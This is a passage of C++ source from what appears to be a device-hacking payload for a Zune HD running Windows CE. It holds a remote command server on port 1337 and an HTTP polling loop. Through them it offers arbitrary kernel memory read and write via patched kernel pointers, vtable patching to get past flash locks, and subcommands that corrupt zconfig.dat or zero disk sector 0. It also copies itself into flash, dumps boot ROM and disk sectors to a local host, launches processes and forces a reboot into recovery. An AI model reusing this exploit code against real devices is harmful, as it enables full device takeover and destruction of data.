	if (vbase) VirtualFree(vbase, 0, MEM_RELEASE);

} else if (inbuf[0] == 15) {
u32 idx = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
u32 idx2 = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
u32 val = ((u32)inbuf[9]) | ((u32)(inbuf[10] << 8)) | ((u32)(inbuf[11] << 16)) | ((u32)(inbuf[12] << 24));
	
				//char* out = (char*)calloc(cccc, 4);
				#if 1
					kwr(0x80060da0, 0x80069de0);

					HMODULE mh = GetModuleHandleW(L"coredll.dll");
					//NKCreateStaticMapping
					CSM csm = (CSM) GetProcAddress(mh, L"GetFSHeapInfo");

					SetLastError(0);
					//void* ahb_arb = csm(0x6000c000, 0x1000);
					//void* boorom = csm(0xFFF00000>>8, 0x10000);
					//void* boorom1 = csm(0xFFF02000>>8, 0x10000);

					DWORD sec_boot = (DWORD)csm(0x60000000>>8, 0x1000);
					kwr(sec_boot+0xc200, 1);


					DWORD clk = (DWORD)csm(0x60006000>>8, 0x1000);

					// enable iram{a,b,c,d}
					DWORD clk_rst_controller_clk_out_enb_u_0 = kreadu32(clk + 0x18);
					clk_rst_controller_clk_out_enb_u_0 |= (1<<20);
					clk_rst_controller_clk_out_enb_u_0 |= (1<<21);
					clk_rst_controller_clk_out_enb_u_0 |= (1<<22);
					clk_rst_controller_clk_out_enb_u_0 |= (1<<23);
					kwr(clk+0x18, clk_rst_controller_clk_out_enb_u_0);



					void* f = (void*)csm(idx>>8, val);

					kwr(0x80060da0, 0x80015020);
					
			
					KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");

					for(u32 j=idx2;j<val;j++) {
						char out[1];
						out[0] = (char)ghi((DWORD)f + j, 0, 0x1338);
						if (send(client,(char*)out,1,0) == SOCKET_ERROR){
							closesocket(client);
							break;
						}
						//Sleep(100);
					}
				#endif
} else if (inbuf[0] == 16) {
	zunecom_CommandReq msg = zunecom_CommandReq_init_zero;
	pb_istream_t pbstream = pb_istream_from_buffer(&inbuf[1], res-1);
	if(!pb_decode(&pbstream, zunecom_CommandReq_fields, &msg)) {
		memset(out, 0, 128);
		memset(foo, 0, 128);
		send(client,(char*)PB_GET_ERROR(&pbstream),128,0);

		std::swprintf(foo, L" pb err: %S r: %d", PB_GET_ERROR(&pbstream), res-1);
		memcpy(out, foo, 128);
		out[0] = 0xCD;

		if (safe_send(client,(unsigned char*)out, 128)){
			closesocket(client);
			break;
		}
		continue;
	}
	pb_ostream_t ostream = pb_ostream_from_buffer(out, OBUFSZ);
	

	WIN32_FIND_DATA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    BOOL r=1;
	char tmpbuf[200];

	switch(msg.cmd) {
		case zunecom_CommandReq_CommandType_CMD_LSDIR:
		{


		
		resp.cmd = zunecom_CommandResp_ResType_RSP_LSDIR;
		resp.which_payload = zunecom_CommandResp_lsdir_tag;

		memset(foo, 0, 256);
		std::swprintf(foo, L"%S", msg.payload.lsdir.path);


		hFind = FindFirstFile(foo, &ffd);

		if (INVALID_HANDLE_VALUE == hFind) {
			memset(out, 0, 128);
			out[0] = 0xCE;
			memcpy(&out[2], foo, 256);


			if (safe_send(client,(unsigned char*)out, 256)){
				closesocket(client);
				break;
			}
		  break;
		} 
#define ZUNECOM_PATH_LEN 270
		#define ZUNECOM_PATH_CNT 270

		resp.payload.lsdir.path_count = 0;

		wcstombs(tmpbuf, ffd.cFileName, ZUNECOM_PATH_LEN-2);
		strncpy(resp.payload.lsdir.path[resp.payload.lsdir.path_count].path, tmpbuf, ZUNECOM_PATH_LEN-2);
		if(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			resp.payload.lsdir.path[resp.payload.lsdir.path_count].is_dir = true;
		 } else {
			resp.payload.lsdir.path[resp.payload.lsdir.path_count].is_dir = false;
		 }
		resp.payload.lsdir.path_count++;

		for(; resp.payload.lsdir.path_count < ZUNECOM_PATH_CNT-2;) {
			  r = FindNextFile(hFind, &ffd);
			  if (r == 0) {break;}
			  wcstombs(tmpbuf, ffd.cFileName, ZUNECOM_PATH_LEN-2);
			  strncpy(resp.payload.lsdir.path[resp.payload.lsdir.path_count].path, tmpbuf, ZUNECOM_PATH_LEN-2);
			 
			  if(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				  resp.payload.lsdir.path[resp.payload.lsdir.path_count].is_dir = true;
			  } else {
				  resp.payload.lsdir.path[resp.payload.lsdir.path_count].is_dir = false;
			  }

			  resp.payload.lsdir.path_count++;
		}

	
	if(!pb_encode(&ostream, zunecom_CommandResp_fields, &resp)) {
		memset(out, 0, 128);
		memset(foo, 0, 128);
		//send(client,(char*)PB_GET_ERROR(&pbstream),256,0);

		std::swprintf(foo, L"pb err: '%S' pc:%d", PB_GET_ERROR(&pbstream), resp.payload.lsdir.path_count);
		memcpy(out, foo, 256);
		out[0] = 0xCF;
		if (safe_send(client,(unsigned char*)out, 256)) { closesocket(client); break; }
	} else {
		if(safe_send(client, (unsigned char*) out, ostream.bytes_written)) {
			closesocket(client);
			break;
		}
	}

	}
	break;

		case zunecom_CommandReq_CommandType_CMD_RDFILE:
			{
				

				std::swprintf(foo, L"%S", msg.payload.rdfile.path);
				HANDLE f = CreateFileW(foo, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

				DWORD hFz = 0;
				DWORD lowfz = GetFileSize(f, &hFz);

			  
			  DWORD cnt = 0;
			  while(true) {
				cnt = 0;

				resp.cmd = zunecom_CommandResp_ResType_RSP_RDFILE_DATA;
				resp.which_payload = zunecom_CommandResp_rdfile_tag;

				r = ReadFile(f, &resp.payload.rdfile.data.bytes[0], RDFILESZ-50, &cnt, NULL);
				resp.payload.rdfile.data.size = cnt;
				resp.payload.rdfile.fullsz = lowfz;
				if(cnt == 0) {
					break;
				}

				ostream = pb_ostream_from_buffer(out, OBUFSZ);

				if(!pb_encode(&ostream, zunecom_CommandResp_fields, &resp)) {
					memset(out, 0, 128);
					std::swprintf(foo, L"pb err: %S", PB_GET_ERROR(&pbstream));
					memcpy(out, foo, 128);
					out[0] = 0xDF;

					if (safe_send(client,(unsigned char*)out, 128)){
						closesocket(client);
						break;
					}
				}
				if (safe_send(client,(unsigned char*)out, ostream.bytes_written)){
					closesocket(client);
					break;
				}
				Sleep(100);

			  }
			  CloseHandle(f);

				resp.cmd = zunecom_CommandResp_ResType_RSP_RDFILE_EOF;
				resp.which_payload = zunecom_CommandResp_eof_tag;
				
				ostream = pb_ostream_from_buffer(out, OBUFSZ);

				if(!pb_encode(&ostream, zunecom_CommandResp_fields, &resp)) {
					memset(out, 0, 128);
					std::swprintf(foo, L"pb err: %S", PB_GET_ERROR(&pbstream));
					memcpy(out, foo, 128);
					out[0] = 0xDE;

					if (safe_send(client,(unsigned char*)out, 128)){
						closesocket(client);
						break;
					}
				}

				if (safe_send(client, (unsigned char*)out, ostream.bytes_written)){
					closesocket(client);
					break;
				}
			}
			break;
	 

	default:
		out[0] = 0xFF;
		if (safe_send(client,(unsigned char*)out, 32)){
			closesocket(client);
			break;
		}
		break;
}


			// Cmd 26: Flash sector read via zargsflash vtable patch
			// Patches the lock function to bypass exclusive access, then calls IOCTL 0x100
			// Packet: [26][count:1] (count = sectors to read, default 1, max 4)
			} else if (inbuf[0] == 26) {
				out[0] = 26;
				u32 count = inbuf[1];
				if (count == 0) count = 1;
				if (count > 4) count = 4;

				// zargsflash vtable[0x17] at 0xC0AD205C = lock function
				// zpartstream IOControl at 0xC0AE1300 = "mov r0, #0; bx lr"
				u32 vtable_addr = 0xC0AD205C;
				u32 return0_addr = 0xC0AE1300;

				// Save and patch vtable
				u32 old_lock_fn = kreadu32(vtable_addr);
				kwr(vtable_addr, return0_addr);

				// Open ZAF1:
				HANDLE hZaf = CreateFileW(L"ZAF1:", 0,
					FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
					OPEN_EXISTING, 0, NULL);

				if (hZaf == INVALID_HANDLE_VALUE) {
					out[1] = 0;
					*(u32*)&out[4] = GetLastError();
					kwr(vtable_addr, old_lock_fn);
					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
				} else {
					out[1] = 1;

					// IOCTL 0x100 input: {ptr0, ptr1, ptr2, count}
					unsigned char* data_buf = (unsigned char*)calloc(2048 * count, 1);
					unsigned char* spare_buf = (unsigned char*)calloc(2048, 1);
					unsigned char* status_buf = (unsigned char*)calloc(count, 1);

					DWORD ioctl_input[4];
					ioctl_input[0] = (DWORD)data_buf;
					ioctl_input[1] = (DWORD)spare_buf;
					ioctl_input[2] = (DWORD)status_buf;
					ioctl_input[3] = count;

					DWORD ret = 0;
					BOOL ok = DeviceIoControl(hZaf, 0x100, ioctl_input, 16, NULL, 0, &ret, NULL);
					DWORD err = ok ? 0 : GetLastError();

					out[2] = ok ? 1 : 0;
					*(u32*)&out[4] = err;
					*(u32*)&out[8] = count;
					*(u32*)&out[12] = ret;

					u32 data_nz = 0;
					for (u32 i = 0; i < 2048 * count; i++)
						if (data_buf[i] != 0) data_nz++;
					*(u32*)&out[16] = data_nz;

					u32 ecec_off = 0xFFFFFFFF;
					for (u32 i = 0; i + 3 < 2048 * count; i++) {
						if (data_buf[i]=='E' && data_buf[i+1]=='C' &&
						    data_buf[i+2]=='E' && data_buf[i+3]=='C') {
							ecec_off = i;
							break;
						}
					}
					*(u32*)&out[20] = ecec_off;

					CloseHandle(hZaf);
					kwr(vtable_addr, old_lock_fn);

					if (safe_send(client, (unsigned char*)out, 32)) {
						free(data_buf); free(spare_buf); free(status_buf);
						closesocket(client); break;
					}
					if (safe_send(client, data_buf, 2048 * count)) {
						free(data_buf); free(spare_buf); free(status_buf);
						closesocket(client); break;
					}

					free(data_buf);
					free(spare_buf);
					free(status_buf);
				}

			// Cmd 27: Flash write test
			// subcmd 0: probe write to Flash
			// subcmd 1: backup zconfig.dat
			// subcmd 2: corrupt zconfig.dat
			// subcmd 3: raw write DSK1 sector 0
			} else if (inbuf[0] == 27) { {
				HANDLE hf27;
				DWORD written27, err27, bytesRead27, fsize27, ret27;
				BOOL wok27, ok27;
				unsigned char* fbuf27;
				u32 subcmd27 = inbuf[1];
				out[0] = 27;

				if (subcmd27 == 0) {
					// Probe: write a test file to Flash partition
					hf27 = CreateFileW(L"\\Flash\\zuneslayer_test.tmp",
						0x40000000, 0, NULL, 2, 0x80, NULL);
					if (hf27 != INVALID_HANDLE_VALUE) {
						char testdata[] = "zuneslayer write test";
						written27 = 0;
						wok27 = WriteFile(hf27, testdata, sizeof(testdata), &written27, NULL);
						CloseHandle(hf27);
						out[1] = 1;
						out[2] = wok27 ? 1 : 0;
						*(u32*)&out[4] = written27;
						// Delete it
						DeleteFileW(L"\\Flash\\zuneslayer_test.tmp");
					} else {
						out[1] = 0;
						*(u32*)&out[4] = GetLastError();
					}
					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }

				} else if (subcmd27 == 1) {
					// Backup: read zconfig.dat
					hf27 = CreateFileW(L"\\Flash\\zconfig.dat",
						GENERIC_READ, FILE_SHARE_READ, NULL,
						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (hf27 != INVALID_HANDLE_VALUE) {
						fsize27 = GetFileSize(hf27, NULL);
						fbuf27 = (unsigned char*)calloc(fsize27 + 1, 1);
						bytesRead27 = 0;
						ReadFile(hf27, fbuf27, fsize27, &bytesRead27, NULL);
						CloseHandle(hf27);
						out[1] = 1;
						*(u32*)&out[4] = bytesRead27;
						if (safe_send(client, (unsigned char*)out, 32)) {
							free(fbuf27); closesocket(client); break;
						}
						if (safe_send(client, fbuf27, bytesRead27)) {
							free(fbuf27); closesocket(client); break;
						}
						free(fbuf27);
					} else {
						out[1] = 0;
						*(u32*)&out[4] = GetLastError();
						if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
					}

				} else if (subcmd27 == 2) {
					// Corrupt: write zeros to first 512 bytes of zconfig.dat
					hf27 = CreateFileW(L"\\Flash\\zconfig.dat",
						0x40000000, 0, NULL,
						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (hf27 != INVALID_HANDLE_VALUE) {
						unsigned char zeros[512];
						memset(zeros, 0, 512);
						written27 = 0;
						SetFilePointer(hf27, 0, NULL, FILE_BEGIN);
						wok27 = WriteFile(hf27, zeros, 512, &written27, NULL);
						err27 = wok27 ? 0 : GetLastError();
						CloseHandle(hf27);
						out[1] = 1;
						out[2] = wok27 ? 1 : 0;
						*(u32*)&out[4] = err27;
						*(u32*)&out[8] = written27;
					} else {
						out[1] = 0;
						*(u32*)&out[4] = GetLastError();
					}
					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }

				} else if (subcmd27 == 3) {
					// Raw write: IOCTL 3 on DSK1: sector 0
					HANDLE hDsk27 = CreateFileW(L"DSK1:", GENERIC_READ | GENERIC_WRITE,
						FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
						OPEN_EXISTING, 0, NULL);
					if (hDsk27 != INVALID_HANDLE_VALUE) {
						// Write zeros to sector 0 via IOCTL 3 (DISK_IOCTL_WRITE)
						unsigned char* secbuf = (unsigned char*)calloc(2048, 1);
						struct { DWORD start; DWORD num_sec; DWORD num_sg; DWORD status;
						         DWORD callback; DWORD sb_buf; DWORD sb_len; } sg;
						sg.start = 0; sg.num_sec = 1; sg.num_sg = 1; sg.status = 0;
						sg.callback = 0; sg.sb_buf = (DWORD)secbuf; sg.sb_len = 2048;
						ret27 = 0;
						ok27 = DeviceIoControl(hDsk27, 3, &sg, sizeof(sg), NULL, 0, &ret27, NULL);
						err27 = ok27 ? 0 : GetLastError();
						CloseHandle(hDsk27);
						out[1] = 1;
						out[2] = ok27 ? 1 : 0;
						*(u32*)&out[4] = err27;
						*(u32*)&out[8] = sg.status;
						free(secbuf);
					} else {
						out[1] = 0;
						*(u32*)&out[4] = GetLastError();
					}
					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }

				} else if (subcmd27 == 4) {
					// PMC reboot to recovery (APX mode)
					// Map PMC via NKCreateStaticMapping (PA 0x7000E000, 1 page)
					// PMC base at PA 0x7000E400 = mapped + 0x400
					// PMC_CNTRL at PMC+0x00, PMC_SCRATCH0 at PMC+0x50
					HMODULE mhPmc = GetModuleHandleW(L"coredll.dll");

					// Step 1: Map PMC page
					kwr(0x80060da0, 0x80069de0); // redirect to NKCreateStaticMapping
					CSM csmPmc = (CSM) GetProcAddress(mhPmc, L"GetFSHeapInfo");
					DWORD pmc_map = (DWORD)csmPmc(0x7000E000 >> 8, 1); // map 1 page
					kwr(0x80060da0, 0x80015020); // restore to kreadb
					KFSH ghiPmc = (KFSH) GetProcAddress(mhPmc, L"GetFSHeapInfo");

					if (pmc_map == 0) {
						out[1] = 0;
						*(u32*)&out[4] = 0xDEAD0001; // mapping failed
						if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
					} else {
						// PMC base within mapped page: offset 0x400
						DWORD pmc_base = pmc_map + 0x400;

						// Step 2: Read current SCRATCH0
						u32 scratch0 = (u32)ghiPmc(pmc_base + 0x50, 0, 0x1338);
						scratch0 |= ((u32)ghiPmc(pmc_base + 0x51, 0, 0x1338)) << 8;
						scratch0 |= ((u32)ghiPmc(pmc_base + 0x52, 0, 0x1338)) << 16;
						scratch0 |= ((u32)ghiPmc(pmc_base + 0x53, 0, 0x1338)) << 24;

						out[1] = 1; // mapped ok
						*(u32*)&out[4] = pmc_map;
						*(u32*)&out[8] = scratch0;

						// Read PMC_CNTRL too
						u32 pmc_cntrl = (u32)ghiPmc(pmc_base + 0x00, 0, 0x1338);
						pmc_cntrl |= ((u32)ghiPmc(pmc_base + 0x01, 0, 0x1338)) << 8;
						pmc_cntrl |= ((u32)ghiPmc(pmc_base + 0x02, 0, 0x1338)) << 16;
						pmc_cntrl |= ((u32)ghiPmc(pmc_base + 0x03, 0, 0x1338)) << 24;
						*(u32*)&out[12] = pmc_cntrl;

						// If inbuf[2] == 0x42 (magic confirm byte), actually do the reboot
						if (inbuf[2] == 0x42) {
							// Write recovery flag to SCRATCH0 (set bit 1)
							kwr(pmc_base + 0x50, scratch0 | 0x02);
							// Trigger system reset: set bit 4 of PMC_CNTRL
							kwr(pmc_base + 0x00, pmc_cntrl | 0x10);
							// If we get here, reset didn't work
							out[16] = 0xFF;
						} else {
							out[16] = 0; // dry run, no reboot
						}

						if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
					}
				}

			} // end cmd 27 inner scope

			// Cmd 23: Registry dump
			} else if (inbuf[0] == 23) {
				out[0] = 23;
				WCHAR regpath[128];
				memset(regpath, 0, sizeof(regpath));
				// ASCII path from inbuf[1..31]
				for (int i = 0; i < 30 && inbuf[1+i]; i++)
					regpath[i] = (WCHAR)inbuf[1+i];

				HKEY hk;
				LONG rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, regpath, 0, KEY_READ, &hk);
				out[1] = (rc == ERROR_SUCCESS) ? 1 : 0;
				*(u32*)&out[4] = (u32)rc;

				u32 off = 32;
				if (rc == ERROR_SUCCESS) {
					WCHAR name[128];
					for (DWORD i = 0; ; i++) {
						DWORD nlen = 128;
						if (RegEnumKeyExW(hk, i, name, &nlen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
						for (DWORD j = 0; j < nlen && off < 0xF000; j++)
							out[off++] = (unsigned char)(name[j] & 0x7F);
						if (off < 0xF000) out[off++] = '\n';
					}
					if (off < 0xF000) { out[off++] = '-'; out[off++] = '\n'; }
					BYTE valdata[256];
					for (DWORD i = 0; ; i++) {
						DWORD nlen = 128, dlen = 256, type = 0;
						if (RegEnumValueW(hk, i, name, &nlen, NULL, &type, valdata, &dlen) != ERROR_SUCCESS) break;
						for (DWORD j = 0; j < nlen && off < 0xEF00; j++)
							out[off++] = (unsigned char)(name[j] & 0x7F);
						out[off++] = '=';
						out[off++] = '0' + (type % 10);
						out[off++] = ':';
						for (DWORD j = 0; j < dlen && j < 64 && off < 0xEF80; j++) {
							out[off++] = "0123456789abcdef"[valdata[j] >> 4];
							out[off++] = "0123456789abcdef"[valdata[j] & 0xF];
						}
						if (off < 0xF000) out[off++] = '\n';
					}
					RegCloseKey(hk);
				}

				if (safe_send(client, (unsigned char*)out, off)) { closesocket(client); break; }

			// Cmd 25: IOCTL probe on ZAF1:
			// Sends a range of IOCTLs and reports which succeed
			// inbuf[1..4] = start IOCTL, inbuf[5..8] = end IOCTL, inbuf[9..12] = step
			} else if (inbuf[0] == 25) {
				out[0] = 25;
				HANDLE h = CreateFileW(L"ZAF1:", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
					OPEN_EXISTING, 0, NULL);
				if (h == INVALID_HANDLE_VALUE) {
					out[1] = 0;
					*(u32*)&out[4] = GetLastError();
					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
				} else {
					u32 ioctl_start = *(u32*)&inbuf[1];
					u32 ioctl_end = *(u32*)&inbuf[5];
					u32 ioctl_step = *(u32*)&inbuf[9];
					if (ioctl_step == 0) ioctl_step = 4;
					if (ioctl_end == 0) ioctl_end = ioctl_start + 0x100;

					u32 off = 32;
					u32 n_found = 0;
					unsigned char* iobuf = (unsigned char*)calloc(512, 1);
					unsigned char* inbuf2 = (unsigned char*)calloc(512, 1);
					for (u32 code = ioctl_start; code < ioctl_end && off < 0xF000; code += ioctl_step) {
						DWORD ret = 0;
						memset(iobuf, 0, 512);
						BOOL ok = DeviceIoControl(h, code, inbuf2, 512, iobuf, 512, &ret, NULL);
						if (ok || ret > 0) {
							*(u32*)&out[off] = code;
							*(u32*)&out[off+4] = ret;
							out[off+8] = ok ? 1 : 0;
							// First 8 bytes of output
							memcpy(&out[off+9], iobuf, 8);
							off += 20;
							n_found++;
						}
					}
					out[1] = 1;
					*(u32*)&out[4] = n_found;
					free(iobuf);
					free(inbuf2);
					CloseHandle(h);
					if (safe_send(client, (unsigned char*)out, off)) { closesocket(client); break; }
				}

			// Cmd 24: Launch process
			} else if (inbuf[0] == 24) {
				out[0] = 24;
				WCHAR exepath[128];
				WCHAR cmdline[64];
				memset(exepath, 0, sizeof(exepath));
				memset(cmdline, 0, sizeof(cmdline));
				// exe path from inbuf[1..] until null
				int p = 0;
				for (int i = 0; i < 30 && inbuf[1+i]; i++)
					exepath[p++] = (WCHAR)inbuf[1+i];

				PROCESS_INFORMATION pi;
				memset(&pi, 0, sizeof(pi));
				BOOL ok = CreateProcessW(exepath, L"Start", NULL, NULL, FALSE, 0, NULL, NULL, NULL, &pi);
				out[1] = ok ? 1 : 0;
				*(u32*)&out[4] = ok ? pi.dwProcessId : GetLastError();

				if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }

			} else {
				out[0] = 0xFF;
				if (safe_send(client,(unsigned char*)out, 32)){
					closesocket(client);
					break;
				}
			}
		}

}

static int http_post(const char* path, unsigned char* data, u32 len) {
	SOCKET hs = socket(AF_INET, SOCK_STREAM, 0);
	if (hs == INVALID_SOCKET) return -1;
	SOCKADDR_IN ha;
	ha.sin_family = AF_INET;
	ha.sin_port = htons(8080);
	ha.sin_addr.s_addr = inet_addr("192.168.55.100");
	int result = -2;
	if (connect(hs, (LPSOCKADDR)&ha, sizeof(ha)) == 0) {
		char hdr[256];
		sprintf(hdr, "POST %s HTTP/1.0\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\nConnection: close\r\n\r\n", path, len);
		send(hs, hdr, strlen(hdr), 0);
		send(hs, (char*)data, len, 0);
		char resp[64];
		recv(hs, resp, 64, 0);
		result = 0;
	}
	closesocket(hs);
	return result;
}

// HTTP GET -- returns body length, or -1 on error, 0 on 204/empty
// Streams response directly into out_buf (supports large downloads)
static int http_get(const char* path, unsigned char* out_buf, u32 out_max) {
	SOCKET hs = socket(AF_INET, SOCK_STREAM, 0);
	if (hs == INVALID_SOCKET) return -1;
	SOCKADDR_IN ha;
	ha.sin_family = AF_INET;
	ha.sin_port = htons(8080);
	ha.sin_addr.s_addr = inet_addr("192.168.55.100");
	int result = -2;
	if (connect(hs, (LPSOCKADDR)&ha, sizeof(ha)) == 0) {
		char hdr[256];
		sprintf(hdr, "GET %s HTTP/1.0\r\nConnection: close\r\n\r\n", path);
		send(hs, hdr, strlen(hdr), 0);

		// Read HTTP header first (up to 1024 bytes, look for \r\n\r\n)
		char hbuf[1024];
		int hlen = 0;
		int header_end = -1;
		while (hlen < (int)sizeof(hbuf)) {
			int n = recv(hs, hbuf + hlen, 1, 0);
			if (n <= 0) break;
			hlen += n;
			if (hlen >= 4 &&
				hbuf[hlen-4]=='\r' && hbuf[hlen-3]=='\n' &&
				hbuf[hlen-2]=='\r' && hbuf[hlen-1]=='\n') {
				header_end = hlen;
				break;
			}
		}

		if (header_end < 0) { closesocket(hs); return -3; }

		// Parse status code from "HTTP/1.0 NNN"
		int status = 0;
		if (hlen > 12) {
			for (int i = 9; i < 12; i++)
				status = status * 10 + (hbuf[i] - '0');
		}

		if (status == 204) {
			result = 0;
		} else if (status == 200) {
			// Read body directly into out_buf
			u32 got = 0;
			int n;
			while (got < out_max && (n = recv(hs, (char*)out_buf + got, out_max - got, 0)) > 0) {
				got += n;
			}
			result = (int)got;
		} else {
			result = -status;
		}
	}
	closesocket(hs);
	return result;
}

// HTTP POST response (convenience for command responses)
static int http_post_response(unsigned char* data, u32 len) {
	return http_post("/cmd/response", data, len);
}

DWORD Server(void* sd_) {
		SOCKADDR_IN addr;
		SOCKET client;
		SOCKET sd;

		addr.sin_family = AF_INET;
		addr.sin_port = htons (1337);
		addr.sin_addr.s_addr = htonl (INADDR_ANY);
		

		// Create Socket
		if((sd = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET) {
			ZDKSystem_ShowMessageBox(L"Sock fail", MESSAGEBOX_TYPE_OK);
			return 0;
		}

	// Copy self to \Flash2\payload.exe -- must happen after hax() for kernel privs
	CopyFileW(L"\\gametitle\\584E07D1\\Content\\nativeapp.exe", L"\\Flash2\\payload.exe", false);

	ZDKSystem_ShowMessageBox(getIpAddress(), MESSAGEBOX_TYPE_OK);

	int bind_ok = 0;
	int reuse = 1;
	setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));
	if (bind(sd, (LPSOCKADDR)&addr, sizeof(addr)) != SOCKET_ERROR) {
		if (listen(sd, 5) != SOCKET_ERROR) {
			bind_ok = 1;
		}
	}

	// Auto-upload IROM page 0 only (pages 1-15 cause data abort due to PIROM_DISABLE)
	{
		HMODULE mhA = GetModuleHandleW(L"coredll.dll");

		for (u32 page = 0; page < 1; page++) {
			u32 page_phys = 0xFFF00000 + page * 0x1000;

			// Map this single IROM page
			kwr(0x80060da0, 0x80069de0);
			CSM csmA = (CSM) GetProcAddress(mhA, L"GetFSHeapInfo");
			DWORD irom_mapA = (DWORD)csmA(page_phys >> 8, 1);
			kwr(0x80060da0, 0x80015020);
			KFSH ghiA = (KFSH) GetProcAddress(mhA, L"GetFSHeapInfo");

			if (!irom_mapA) continue;

			// Read 4KB
			unsigned char irom_buf[4096];
			for (u32 i = 0; i < 4096; i++) {
				irom_buf[i] = (unsigned char)ghiA(irom_mapA + i, 0, 0x1338);
			}

			// Upload as irom_pageNN.bin
			char path[64];
			sprintf(path, "/upload/irom_page%02d.bin", page);
			http_post(path, irom_buf, 4096);
		}
	}

	// Also probe block devices and upload sector 0 (for BCT analysis)
	{
		LPCWSTR dev_names[] = {
			L"DSK1:", L"DSK2:", L"DSK3:", L"DSK4:",
			L"FLASHDRV:", L"NAND1:", L"NAND2:",
			L"Store:", L"Part00:", L"Part01:", L"Part02:",
			NULL
		};

		for (int d = 0; dev_names[d] != NULL; d++) {
			HANDLE h = CreateFileW(dev_names[d],
				GENERIC_READ, FILE_SHARE_READ, NULL,
				OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (h != INVALID_HANDLE_VALUE) {
				unsigned char sector[512];
				DWORD bytesRead = 0;
				SetFilePointer(h, 0, NULL, FILE_BEGIN);
				ReadFile(h, sector, 512, &bytesRead, NULL);
				CloseHandle(h);

				if (bytesRead > 0) {
					char path[64];
					sprintf(path, "/upload/blkdev_%d_sector0.bin", d);
					http_post(path, sector, bytesRead);
				}
				break; // use first accessible device
			}
		}
	}

	// Skip reverse-connect to PC:1337 -- it blocks the HTTP polling loop.
	// The HTTP command channel (/cmd/poll) replaces this for USB mode.

	// Accept loop (WiFi) -- only if bind succeeded
	if (bind_ok) {
		while(!dead) {
			client = accept(sd,NULL,NULL);
			connection(client);
		}
	}

	// HTTP command polling loop -- works over USB (device→PC only)
	// Polls httpserv at 192.168.55.100:8080 for commands
	{
		HMODULE mh = GetModuleHandleW(L"coredll.dll");
		unsigned char cmd[32];
		unsigned char resp[8192];

		while (!dead) {
			Sleep(500);

			int n = http_get("/cmd/poll", cmd, 32);
			if (n < 32) continue; // no command or error

			// Process command -- same IDs as TCP protocol
			memset(resp, 0, sizeof(resp));
			resp[0] = cmd[0]; // echo command ID
			u32 resp_len = 32;

			if (cmd[0] == 1) {
				// kread_u32(addr)
				u32 addr = *(u32*)&cmd[4];
				kwr(0x80060da0, 0x80015020);
				KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");
				u32 val = (u32)ghi(addr, 0, 0x1338);
				*(u32*)&resp[4] = val;
				resp[1] = 1; // success

			} else if (cmd[0] == 20) {
				// kwrite_u32(addr, val)
				u32 addr = *(u32*)&cmd[4];
				u32 val = *(u32*)&cmd[8];
				kwr(addr, val);
				resp[1] = 1;

			} else if (cmd[0] == 22) {
				// BCT probe/corrupt -- subcmd 0=scan all devices, 1=corrupt
				// Response: [22][n_found][...per-device results...]
				// Appended: for each device that opened, 512-byte sector
				u32 subcmd = cmd[1];
				LPCWSTR dev_names[] = {
					L"ZAF1:", L"ZAF2:", L"ZAF3:",
					L"DSK1:", L"DSK2:", L"DSK3:",
					L"Store:", L"Part00:", L"Part01:",
					L"\\Flash2\\ZBoot",
					L"\\Windows\\ZBoot",
					NULL
				};

				u32 n_found = 0;
				u32 best_dev = 0xFF;
				u32 best_ecec_off = 0;
				resp_len = 32;

				for (int d = 0; dev_names[d] != NULL; d++) {
					DWORD access = (subcmd == 1) ? (GENERIC_READ | GENERIC_WRITE) : GENERIC_READ;
					HANDLE h = CreateFileW(dev_names[d],
						access, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (h == INVALID_HANDLE_VALUE) continue;

					unsigned char sector[2048];
					DWORD bytesRead = 0;
					memset(sector, 0, 2048);
					SetFilePointer(h, 0, NULL, FILE_BEGIN);
					BOOL ok = ReadFile(h, sector, 2048, &bytesRead, NULL);
					DWORD readErr = ok ? 0 : GetLastError();

					// If ReadFile with 2048 returned 0, try 512
					if (bytesRead == 0) {
						SetFilePointer(h, 0, NULL, FILE_BEGIN);
						ok = ReadFile(h, sector, 512, &bytesRead, NULL);
						readErr = ok ? 0 : GetLastError();
					}

					// Pack per-device info: [idx][ok][bytesRead_lo][bytesRead_hi][err_lo][err_hi]
					if (n_found < 4) {
						u32 off = 4 + n_found * 6;
						resp[off] = d;
						resp[off+1] = ok ? 1 : 0;
						resp[off+2] = bytesRead & 0xFF;
						resp[off+3] = (bytesRead >> 8) & 0xFF;
						resp[off+4] = readErr & 0xFF;
						resp[off+5] = (readErr >> 8) & 0xFF;
					}

					// Append sector data to response (cap at 2048 per device)
